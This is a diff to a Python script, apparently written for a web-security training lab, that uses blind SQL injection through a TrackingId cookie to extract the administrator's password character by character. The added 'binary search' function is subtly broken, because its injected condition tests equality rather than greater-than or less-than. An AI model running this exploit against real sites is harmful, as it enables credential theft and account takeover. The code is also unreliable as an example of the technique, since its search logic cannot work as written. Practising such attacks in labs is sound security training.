@@ -29,16 +29,16 @@ import urllib
 
 proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }
 
-# url = 'https://0af700a503bab58c99a2b73f005f008c.web-security-academy.net/'
+# url = 'https://0a58002f04a5c57a80e73fde00e900d2.web-security-academy.net/'
 
-def sqli_password(url):
+def sqli_passwordFor(url):
     password_extracted = ""
     for i in range (1,21):
         for j in range (32,126):
             sqli_payload = "' and (select ascii (substring(password, %s, 1)) from users where username = 'administrator') = '%s' --" % (i,j)
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-            cookies = {'TrackingId':'94hgPuo2a9GOtTSi' + sqli_payload_encoded,
-                      'session': 'IzSQQXwXr0PLqYY5wArtKU38hQhOmsRg'
+            cookies = {'TrackingId':'NTt4bFEQYbuTaetK' + sqli_payload_encoded,
+                      'session': 'iorA5sCTjq8zx2XFFBBBBcxV6F1Helh5'
                       }
             r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
             if "Welcome" not in r.text:
@@ -49,13 +49,37 @@ def sqli_password(url):
                 sys.stdout.write('\r'+ password_extracted)
                 sys.stdout.flush()
                 break
+
+def sqli_passwordBinary(url):
+    password_extracted = ""
+    for i in range(1, 21):
+        low = 32
+        high = 126
+        password_char = ""
+        while low <= high:
+            mid = (low + high) // 2
+            sqli_payload = "' and (select ascii (substring(password, %s, 1)) from users where username = 'administrator') = '%s' --" % (i, mid)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies = {
+                'TrackingId': 'NTt4bFEQYbuTaetK' + sqli_payload_encoded,
+                'session': 'iorA5sCTjq8zx2XFFBBBBcxV6F1Helh5'
+            }
+            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+            if "Welcome" not in r.text:
+                password_char = chr(mid)
+                high = mid - 1 
+            else:
+                low = mid + 1  
+        password_extracted += password_char
+        sys.stdout.write('\r' + password_extracted)
+        sys.stdout.flush()
 def main(): 
     if len(sys.argv) != 2:
         print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
     url = sys.argv[1]
     print("[+] Retrieving administrator password...")
-    sqli_password(url)
+    sqli_passwordBinary(url)
     
 if __name__ == '__main__':
     main()
